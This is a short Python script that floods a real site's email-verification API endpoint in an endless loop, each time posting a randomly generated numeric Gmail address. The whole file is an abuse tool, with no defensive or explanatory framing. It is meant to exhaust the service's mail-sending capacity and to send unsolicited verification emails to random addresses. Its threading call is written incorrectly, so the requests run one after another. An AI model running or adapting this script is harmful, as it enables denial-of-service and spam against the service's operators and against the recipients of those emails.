import requests
import os
import random
import threading


def send():
    url = 'https://bygcloud.com/api/v1/passport/comm/sendEmailVerify'
    random_num = random.randint(1, 999999999999)
    random_email = "%d@gmail.com" % random_num
    data = {
        'email' : random_email
    }

    r = requests.post(url,data)

    print(random_email,r)

while(True):
    t1 = threading.Thread(target=send())
    t1.start()


